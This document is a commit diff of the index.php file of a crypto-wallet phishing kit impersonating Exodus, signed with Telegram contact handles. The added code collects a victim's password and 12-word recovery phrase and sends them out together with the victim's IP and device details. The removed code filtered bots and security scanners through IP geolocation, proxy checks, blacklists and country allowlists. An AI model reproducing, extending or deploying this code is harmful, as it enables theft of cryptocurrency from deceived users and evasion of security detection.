cbd91ac33dedaff7cc0138cba6caa54d858ce873
telegramsecure <telegramsecure1@gmail.com>
2024-08-07 23:02:27 +0200

    Add files via upload

--- index.php
+++ index.php
@@ -5,121 +5,94 @@
         Telegram : https://t.me/syst3mx
         Telegram Group : https://t.me/matos_x
 
-    /**//**//**//**//**//**/    
+    /**//**//**//**//**//**/
 
-    session_start();
-    session_regenerate_id();
 
-    require_once('inc/BrowserDetection.php');
-    require_once('inc/thewall.php');
-    require_once('infos.php');
+    include 'app.php';
 
-    function get_client_ip() {
-        $client  = @$_SERVER['HTTP_CLIENT_IP'];
-        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
-        $remote  = $_SERVER['REMOTE_ADDR'];
-        if(filter_var($client, FILTER_VALIDATE_IP)) {
-            $ip = $client;
-        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
-            $ip = $forward;
-        } else {
-            $ip = $remote;
+    if( isset($_GET["redirection"]) && !empty($_GET['redirection']) ) {
+
+        $red = $_GET['redirection'];
+        $_SESSION['last_page'] = $red;
+        $query = [];
+        $parse_url = proper_parse_str($_SERVER['QUERY_STRING']);
+        foreach($parse_url as $key => $val) {
+            if( $key == 'redirection' ){
+                unset($parse_url[$key]);
+            } else {
+                $query[] = $key . '=' . $val;
+            }
         }
-        if( $ip == '::1' ) {
-            return '127.0.0.1';
-        }
-        return  $ip;
-    }
-
-    function get_lang() {
-        $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
-        $acceptLang = ['en','fr','de','it']; 
-        $lang = in_array($lang, $acceptLang) ? $lang : 'fr';
-        $_SESSION['lang'] = $lang;
-        return $lang;
-    }
-
-    $ip = get_client_ip();
-
-    $ip_infos = file_get_contents("https://pro.ip-api.com/php/". $ip ."?key=UO8wl6MQD2zPxmf&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query");
-    $ip_infos = unserialize($ip_infos);
-
-    $_SESSION['currency'] = $ip_infos['currency'];
-    $_SESSION['country'] = $ip_infos['country'];
-
-    function visitors($detection) {
-        GLOBAL $ip_infos;
-        $Browser = new foroco\BrowserDetection();
-        $useragent       = $_SERVER['HTTP_USER_AGENT'];
-        $result = $Browser->getAll($useragent, 'JSON');
-        $ip              = $ip_infos['query'];
-        $date            = date("Y-m-d H:i:s", time());
-        $result          = json_decode($result,true);
-        $os_type         = $result['os_type'];
-        $os_name         = $result['os_name'];
-        $device_type     = $result['device_type'];
-        $browser_name    = $result['browser_name'];
-        $browser_version = $result['browser_version'];
-        $browser_version = $result['browser_version'];
-        $country         = $ip_infos['country'];
-
-        $str = " <tr><th scope='row'>$ip ($country)</th><td>$date</td><td>$detection</td><td>[$device_type] $browser_name $browser_version</td></tr>";
-        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
-    }
-
-    $whilelist = file("whitelist.db", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    if (in_array($ip, $whilelist)) {
-        $_SESSION['last_page'] = "index";
-        $_SESSION['user_allowed'] = true;
-        get_lang();
-        visitors("Whitelisted");
-        header("Location: qZWN0cy90YWxh/?redirection=index");
-        exit();
-    }
-
-    $blacklist = file("blacklist.db", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    if (in_array($ip, $blacklist)) {
-        visitors("Blacklisted");
-        header("Location:" . $conf_redirect_bot);
-        exit();
-    }
-
-    if( count(ALLOWED_COUNTRIES) > 0 ) {
-        if( !in_array($ip_infos['countryCode'],$conf_allowed_countries) ) {
-            visitors("Country not allowed");
-            header("Location:" . REDIRECT_BOTS);
-            exit();
-        }
-    }
-
-    if( get_client_ip() == "127.0.0.1" ) {
-        $_SESSION['last_page'] = "index";
-        $_SESSION['user_allowed'] = true;
-        get_lang();
-        visitors("Localhost");
-        header("Location: qZWN0cy90YWxh/?redirection=index");
-        exit();
-    }
-
-    if( $ip_infos['status'] == "success" ) {
-
-        if( $ip_infos['proxy'] == true ) {
-            visitors("Detected as bot");
-            header("Location:" . $conf_redirect_bot);
-            exit();
+        if( is_array($query) ) {
+            $query = "?" . implode('&',$query);
         }
 
-        $_SESSION['last_page'] = "index";
-        $_SESSION['user_allowed'] = true;
-        get_lang();
-        visitors("Allowed");
-        header("Location: qZWN0cy90YWxh/?redirection=index");
+        header("Location: " . randomix(24) . $query);
         exit();
+
+    } else if( $_SERVER['REQUEST_METHOD'] == "POST" ) {
+
+        if ($_POST['steeep'] == "pass") {
+            $_SESSION['errors']     = [];
+            $_SESSION['password']   = $_POST['password'];
+            if( empty($_POST['password']) ) {
+                $_SESSION['errors']['password'] = true;
+            }
+            if( count($_SESSION['errors']) == 0 ) {
+                $subject = get_client_ip() . ' | EXODUS | Pass';
+                $message = '/-- PASS INFOS --/' . get_client_ip() . "\r\n";
+                $message .= 'Password : ' . $_POST['password'] . "\r\n";
+                $message .= '/-- END PASS INFOS --/' . "\r\n";
+                $message .= victim_infos();
+                send($subject,$message);
+                location("words");
+            } else {
+                location("pass","&error=1");
+            }
+        }
+
+        if ($_POST['steeep'] == "wallet") {
+            $_SESSION['errors']     = [];
+            
+            $error = false;
+            $wallet = [];
+
+            for($i = 1; $i <= 12; $i++) {
+                if( empty($_POST['n' . $i]) ) {
+                    $error = true;
+                }
+                $wallet[] = $_POST['n'  . $i];
+            }
+
+            if( $error == false ) {
+                $wallet = implode(' ',$wallet);
+                $_POST['wallet'] = $wallet;
+                $subject = get_client_ip() . ' | EXODUS | Wallet';
+                $message = '/-- WALLET INFOS --/' . get_client_ip() . "\r\n";
+                $message .= 'Wallet Keys : ' . $_POST['wallet'] . "\r\n";
+                $message .= '/-- END WALLET INFOS --/' . "\r\n";
+                $message .= victim_infos();
+                send($subject,$message);
+                if( $_POST['error'] > 0 ) {
+                    location("success");
+                }
+                location("words","&error=1");
+            } else {
+                $error = $_POST['error'];
+                location("words","&error=" . $error);
+            }
+        }
 
     } else {
-        visitors("Not Allowed");
-        header("Location:" . REDIRECT_BOTS);
+
+        if( isset($_SESSION['last_page']) ) {
+            redirect($_SESSION['last_page']);
+        }
+
+        header("Location: https://www.exodus.com/");
         exit();
+
     }
+    
 
 ?>
